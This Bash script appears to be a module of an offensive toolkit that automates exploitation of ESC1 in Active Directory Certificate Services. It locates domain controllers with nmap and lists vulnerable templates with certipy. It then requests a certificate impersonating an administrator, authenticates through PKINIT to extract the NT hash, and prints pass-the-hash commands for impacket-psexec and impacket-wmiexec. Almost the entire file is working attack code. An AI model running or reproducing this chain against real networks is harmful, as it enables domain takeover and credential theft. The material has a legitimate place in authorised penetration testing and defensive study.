#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "ADCS / CERTIPY" "Active Directory Certificate Services enumeration + ESC exploitation"

# ── Tool check ─────────────────────────────────────────────────────────────────
section "TOOLS"

_certipy=""
for _c in certipy certipy-ad; do
  command -v "$_c" &>/dev/null && { _certipy="$_c"; break; }
done
if [[ -z "$_certipy" ]]; then
  printf '  %s[!]%s certipy not found.\n' "${RED}" "${RESET}"
  printf '      pip3 install certipy-ad\n\n'; exit 1
fi
printf '  %s[✓]%s certipy : %s%s%s\n\n' "${GREEN}" "${RESET}" "${DIM}" "$(command -v "$_certipy")" "${RESET}"

# ── Target / DC discovery ──────────────────────────────────────────────────────
target="$(prompt_target)"
_nmap_load="$(pick_nmap_file)"

declare -a DC_HOSTS=()

if [[ -n "$_nmap_load" ]]; then
  outdir="${_nmap_load%%|*}"
  _nmap_txt="${_nmap_load##*|}"

  section "DC DISCOVERY  (from nmap.txt — port 389)"
  _cur=""
  while IFS= read -r _line; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "$_cur" && "$_line" =~ ^(88|389|636)/tcp.*open ]]; then
      _already=0
      for _h in "${DC_HOSTS[@]+"${DC_HOSTS[@]}"}"; do [[ "$_h" == "$_cur" ]] && _already=1; done
      (( _already == 0 )) && DC_HOSTS+=("$_cur") && \
        printf '  %s[+]%s DC candidate : %s\n' "${GREEN}" "${RESET}" "$_cur"
    fi
  done < "$_nmap_txt"
  [[ ${#DC_HOSTS[@]} -eq 0 ]] && \
    printf '  %s[~]%s No LDAP/Kerberos ports in nmap.txt — will scan fresh.\n' "${YELLOW}" "${RESET}"
else
  outdir="$(make_outdir)"
fi

outfile="$outdir/certipy.txt"
: > "$outfile"

if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  section "DC DISCOVERY  (nmap — ports 88,389,636)"
  printf '  %s[*]%s Scanning %s...\n' "${CYAN}" "${RESET}" "$target"

  start_spin "nmap scan"
  mapfile -t _scan < <(
    nmap -sS -Pn -n -T4 --max-retries 2 --max-scan-delay 10ms --min-rate 300 \
         -p 88,389,636 --open "$target" 2>/dev/null
  )
  stop_spin

  _cur=""
  for _line in "${_scan[@]}"; do
    if [[ "$_line" =~ scan\ report\ for\ ([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+) ]]; then
      _cur="${BASH_REMATCH[1]}"
    elif [[ -n "$_cur" && "$_line" =~ ^(88|389|636)/tcp.*open ]]; then
      _already=0
      for _h in "${DC_HOSTS[@]+"${DC_HOSTS[@]}"}"; do [[ "$_h" == "$_cur" ]] && _already=1; done
      (( _already == 0 )) && DC_HOSTS+=("$_cur") && \
        printf '  %s[+]%s DC candidate : %s\n' "${GREEN}" "${RESET}" "$_cur"
    fi
  done
fi

# Manual fallback
if [[ ${#DC_HOSTS[@]} -eq 0 ]]; then
  if [[ ! "$target" =~ /[0-9]+$ ]]; then
    DC_HOSTS+=("$target")
    printf '  %s[~]%s Using target directly as DC: %s\n' "${YELLOW}" "${RESET}" "$target"
  else
    printf '\n  %s>>%s Enter DC IP manually: ' "${CYAN}" "${RESET}"
    IFS= read -r _mdc; [[ -n "$_mdc" ]] && DC_HOSTS+=("$_mdc") || exit 1
  fi
fi

DC_IP="${DC_HOSTS[0]}"
if [[ ${#DC_HOSTS[@]} -gt 1 ]] && [[ -z "${SESSION_DIR:-}" ]]; then
  printf '\n  %s[*]%s Multiple DCs found:\n' "${CYAN}" "${RESET}"
  for _i in "${!DC_HOSTS[@]}"; do
    printf '  %s[%02d]%s  %s\n' "${CYAN}" "$((_i+1))" "${RESET}" "${DC_HOSTS[$_i]}"
  done
  printf '\n  %s>>%s Select DC [1]: ' "${CYAN}" "${RESET}"
  read -r _dp; _dp="${_dp:-1}"
  [[ "$_dp" =~ ^[0-9]+$ ]] && (( _dp >= 1 && _dp <= ${#DC_HOSTS[@]} )) && \
    DC_IP="${DC_HOSTS[$((_dp-1))]}" || DC_IP="${DC_HOSTS[0]}"
fi
printf '\n  %s[SYS]%s DC : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DC_IP" "${RESET}"

# ── Domain ─────────────────────────────────────────────────────────────────────
section "DOMAIN"

_auto_domain="${DOMAIN:-}"
[[ -z "$_auto_domain" ]] && _auto_domain="$(grep -E '^(domain|search)' /etc/resolv.conf 2>/dev/null \
  | head -1 | awk '{print $2}' || true)"

# Pipeline: load domain from chain_domain.txt
if [[ -n "${SESSION_DIR:-}" ]] && [[ -z "$_auto_domain" ]] && [[ -s "${SESSION_DIR}/chain_domain.txt" ]]; then
  _auto_domain=$(head -1 "${SESSION_DIR}/chain_domain.txt")
fi

# Try LDAP anonymous bind for domain if still unknown
if [[ -z "${_auto_domain:-}" ]] && command -v ldapsearch &>/dev/null; then
  _ldap_raw="$(timeout 4 ldapsearch -x -H "ldap://$DC_IP" -b '' -s base \
    defaultNamingContext 2>/dev/null || true)"
  _dc_parts="$(printf '%s' "$_ldap_raw" | grep -oiE 'DC=[^,]+' | sed 's/DC=//I' | paste -sd '.' || true)"
  [[ -n "$_dc_parts" ]] && _auto_domain="$_dc_parts"
fi

if [[ -n "${SESSION_DIR:-}" ]]; then
  DOMAIN="${_auto_domain:-}"
  if [[ -z "$DOMAIN" ]]; then
    printf '  %s[CHAIN]%s No domain available — exiting certipy step%s\n' "${CYAN}" "${RESET}" "${RESET}"
    exit 0
  fi
  printf '  %s[CHAIN]%s Domain: %s  (pipeline auto)%s\n' "${CYAN}" "${RESET}" "$DOMAIN" "${RESET}"
else
  printf '  %s>>%s Domain (e.g. corp.local)' "${CYAN}" "${RESET}"
  [[ -n "${_auto_domain:-}" ]] && printf ' %s[detected: %s]%s' "${DIM}" "$_auto_domain" "${RESET}"
  printf ': '
  read -r DOMAIN
  [[ -z "$DOMAIN" ]] && DOMAIN="${_auto_domain:-}"
  if [[ -z "$DOMAIN" ]]; then
    printf '  %s[!]%s Domain is required.\n' "${RED}" "${RESET}"; exit 1
  fi
fi
printf '  %s[SYS]%s Domain : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$DOMAIN" "${RESET}"

# ── Credentials ────────────────────────────────────────────────────────────────
section "CREDENTIALS"

CRED_USER=""; CRED_PASS=""; CRED_HASH=""

if [[ -n "${SESSION_DIR:-}" ]]; then
  # Pipeline: read from chain_creds.txt
  if [[ -s "${SESSION_DIR}/chain_creds.txt" ]]; then
    _cline=$(grep -m1 'login:.*password:' "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true)
    [[ -n "$_cline" ]] && CRED_USER=$(echo "$_cline" | grep -oP 'login:\s*\K\S+' || true)
    [[ -n "$_cline" ]] && CRED_PASS=$(echo "$_cline" | grep -oP 'password:\s*\K\S+' || true)
  fi
  if [[ -z "$CRED_USER" ]]; then
    printf '  %s[CHAIN]%s No credentials in chain_creds.txt — certipy needs creds%s\n' \
      "${CYAN}" "${RESET}" "${RESET}"
    exit 0
  fi
  printf '  %s[CHAIN]%s Credentials from chain_creds.txt: %s  (pipeline auto)%s\n\n' \
    "${CYAN}" "${RESET}" "$CRED_USER" "${RESET}"
else
  printf '  %s>>%s Username (e.g. jsmith): ' "${CYAN}" "${RESET}"
  read -r CRED_USER
  printf '  %s>>%s Password (or empty to use hash): ' "${CYAN}" "${RESET}"
  set +H
  IFS= read -rs CRED_PASS; echo
  set -H 2>/dev/null || true
  if [[ -z "$CRED_PASS" ]]; then
    printf '  %s>>%s NT hash (format LMHASH:NTHASH or :NTHASH): ' "${CYAN}" "${RESET}"
    IFS= read -r CRED_HASH
  fi
fi

if [[ -z "$CRED_USER" || ( -z "$CRED_PASS" && -z "$CRED_HASH" ) ]]; then
  printf '  %s[!]%s Credentials required.\n' "${RED}" "${RESET}"; exit 1
fi

# Build certipy auth string
if [[ -n "$CRED_HASH" ]]; then
  CERTIPY_CRED=(-u "${CRED_USER}@${DOMAIN}" -hashes "$CRED_HASH" -dc-ip "$DC_IP")
else
  CERTIPY_CRED=(-u "${CRED_USER}@${DOMAIN}" -p "$CRED_PASS" -dc-ip "$DC_IP")
fi

printf '\n  %s[SYS]%s Identity : %s%s@%s%s\n\n' \
  "${CYAN}" "${RESET}" "${GREEN}" "$CRED_USER" "$DOMAIN" "${RESET}"

# ── Phase 1: enumerate vulnerable templates ────────────────────────────────────
section "PHASE 1  —  ADCS ENUMERATION"
printf '  %s[*]%s Running: certipy find --vulnerable ...\n\n' "${CYAN}" "${RESET}"

cd "$outdir"
_FIND_LOG="$outdir/certipy_find.txt"
: > "$_FIND_LOG"

"$_certipy" find "${CERTIPY_CRED[@]}" -vulnerable -stdout 2>&1 | tee "$_FIND_LOG" || true

# Also save any generated files certipy dropped in outdir
# certipy saves as <ts>_Certipy.txt / .json — rename for consistency
for _f in "$outdir"/*_Certipy.txt "$outdir"/*_Certipy.json; do
  [[ -f "$_f" ]] && mv "$_f" "$outdir/$(basename "${_f/*_Certipy/certipy_results}")" 2>/dev/null || true
done

printf '\n' | tee -a "$outfile"
cat "$_FIND_LOG" >> "$outfile"

# ── Parse vulnerable templates ─────────────────────────────────────────────────
declare -a VULN_TEMPLATES=()
declare -a VULN_CAS=()
declare -a VULN_ESCS=()

_cur_tpl="" _cur_ca="" _cur_esc=""
while IFS= read -r _l; do
  if [[ "$_l" =~ Template\ Name[[:space:]]*:\ *(.+) ]]; then
    _cur_tpl="${BASH_REMATCH[1]}"
  elif [[ "$_l" =~ Certificate\ Authorit[^:]*:[[:space:]]*(.+) ]]; then
    _cur_ca="${BASH_REMATCH[1]}"
  elif [[ "$_l" =~ (ESC[0-9]+)[[:space:]]*: ]]; then
    _cur_esc="${BASH_REMATCH[1]}"
    if [[ -n "$_cur_tpl" ]]; then
      VULN_TEMPLATES+=("$_cur_tpl")
      VULN_CAS+=("${_cur_ca:-unknown}")
      VULN_ESCS+=("$_cur_esc")
    fi
  fi
done < "$_FIND_LOG"

if [[ ${#VULN_TEMPLATES[@]} -eq 0 ]]; then
  printf '\n  %s[~]%s No vulnerable templates found — environment may be hardened.\n' \
    "${YELLOW}" "${RESET}"
  printf '  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
  mark_done "$outfile"; exit 0
fi

printf '\n  %s[+]%s %d vulnerable template(s) found:\n\n' \
  "${GREEN}" "${RESET}" "${#VULN_TEMPLATES[@]}"
for _i in "${!VULN_TEMPLATES[@]}"; do
  printf '  %s[%02d]%s  %-32s  %s%-6s%s  CA: %s%s%s\n' \
    "${CYAN}" "$((_i+1))" "${RESET}" \
    "${VULN_TEMPLATES[$_i]}" \
    "${RED}" "${VULN_ESCS[$_i]}" "${RESET}" \
    "${DIM}" "${VULN_CAS[$_i]}" "${RESET}"
done
printf '\n'

# ── Phase 2: exploitation ──────────────────────────────────────────────────────
section "PHASE 2  —  EXPLOITATION"

_esc1_idx=-1
for _i in "${!VULN_ESCS[@]}"; do
  if [[ "${VULN_ESCS[$_i]}" == "ESC1" ]]; then
    _esc1_idx="$_i"; break
  fi
done

if (( _esc1_idx < 0 )); then
  printf '  %s[~]%s No ESC1 template found — auto-exploitation limited to ESC1.\n' \
    "${YELLOW}" "${RESET}"
  printf '  %s[~]%s Review the certipy_find.txt report for manual steps.\n' "${YELLOW}" "${RESET}"
  printf '  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
  mark_done "$outfile"; exit 0
fi

# Use first ESC1 found; let user override
_sel_tpl="${VULN_TEMPLATES[$_esc1_idx]}"
_sel_ca="${VULN_CAS[$_esc1_idx]}"

printf '  %s[+]%s Auto-selected ESC1 template: %s%s%s  CA: %s%s%s\n' \
  "${GREEN}" "${RESET}" "${CYAN}" "$_sel_tpl" "${RESET}" "${DIM}" "$_sel_ca" "${RESET}"
printf '  %s>>%s Override template name? [Enter to keep]: ' "${CYAN}" "${RESET}"
read -r _ot; [[ -n "$_ot" ]] && _sel_tpl="$_ot"
printf '  %s>>%s Override CA name? [Enter to keep]: ' "${CYAN}" "${RESET}"
read -r _oc; [[ -n "$_oc" ]] && _sel_ca="$_oc"

printf '\n  %s>>%s Target UPN to impersonate [administrator@%s]: ' \
  "${CYAN}" "${RESET}" "$DOMAIN"
read -r _target_upn
_target_upn="${_target_upn:-administrator@${DOMAIN}}"

printf '\n  %s[SYS]%s Template : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_sel_tpl"    "${RESET}"
printf '  %s[SYS]%s CA       : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$_sel_ca"     "${RESET}"
printf '  %s[SYS]%s Target   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${GREEN}" "$_target_upn" "${RESET}"

# Request certificate
printf '  %s[*]%s Requesting certificate for %s...\n\n' "${CYAN}" "${RESET}" "$_target_upn"

_REQ_LOG="$outdir/certipy_req.txt"
: > "$_REQ_LOG"

cd "$outdir"
"$_certipy" req "${CERTIPY_CRED[@]}" -ca "$_sel_ca" -template "$_sel_tpl" \
  -upn "$_target_upn" 2>&1 | tee "$_REQ_LOG" || true
cat "$_REQ_LOG" >> "$outfile"

# Find the generated .pfx
_pfx=""
_pfx="$(ls -t "$outdir"/*.pfx 2>/dev/null | head -1 || true)"

if [[ -z "$_pfx" ]]; then
  printf '\n  %s[!]%s No .pfx file generated — request may have failed.\n' "${RED}" "${RESET}"
  printf '  %s[~]%s Review certipy_req.txt for error details.\n\n' "${YELLOW}" "${RESET}"
  mark_done "$outfile"; exit 0
fi

printf '\n  %s[+]%s Certificate saved: %s%s%s\n\n' \
  "${GREEN}" "${RESET}" "${DIM}" "$_pfx" "${RESET}"

# Authenticate with certificate → get NT hash
section "PHASE 3  —  AUTHENTICATE  (PKINIT → NT hash)"
printf '  %s[*]%s Authenticating with certificate...\n\n' "${CYAN}" "${RESET}"

_AUTH_LOG="$outdir/certipy_auth.txt"
: > "$_AUTH_LOG"

"$_certipy" auth -pfx "$_pfx" -dc-ip "$DC_IP" 2>&1 | tee "$_AUTH_LOG" || true
cat "$_AUTH_LOG" >> "$outfile"

# Extract NT hash from output
_nt_hash="$(grep -oE '[0-9a-f]{32}:[0-9a-f]{32}' "$_AUTH_LOG" 2>/dev/null | head -1 || true)"
[[ -z "$_nt_hash" ]] && \
  _nt_hash="$(grep -oiE '[0-9a-f]{32}' "$_AUTH_LOG" 2>/dev/null | tail -1 || true)"

printf '\n'
if [[ -n "$_nt_hash" ]]; then
  printf '  %s┌─────────────────────────────────────────────────────┐%s\n' "${GREEN}" "${RESET}"
  printf '  %s│  NT HASH  :  %s%-38s%s%s│%s\n' \
    "${GREEN}${BOLD}" "${RESET}${CYAN}" "$_nt_hash" "${RESET}${GREEN}${BOLD}" "" "${RESET}"
  printf '  %s└─────────────────────────────────────────────────────┘%s\n\n' "${GREEN}" "${RESET}"
  printf '  %s[*]%s Use with pass-the-hash:\n' "${CYAN}" "${RESET}"
  _admin="${_target_upn%%@*}"
  printf '    impacket-psexec %s/%s@<TARGET> -hashes :%s\n' \
    "$DOMAIN" "$_admin" "${_nt_hash##*:}"
  printf '    impacket-wmiexec %s/%s@<TARGET> -hashes :%s\n\n' \
    "$DOMAIN" "$_admin" "${_nt_hash##*:}"
  printf '%s\n' "NT Hash: $_nt_hash" >> "$outfile"
else
  printf '  %s[~]%s Hash not extracted automatically — check certipy_auth.txt\n\n' \
    "${YELLOW}" "${RESET}"
fi

printf '  %s[SYS]%s Report : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
mark_done "$outfile"
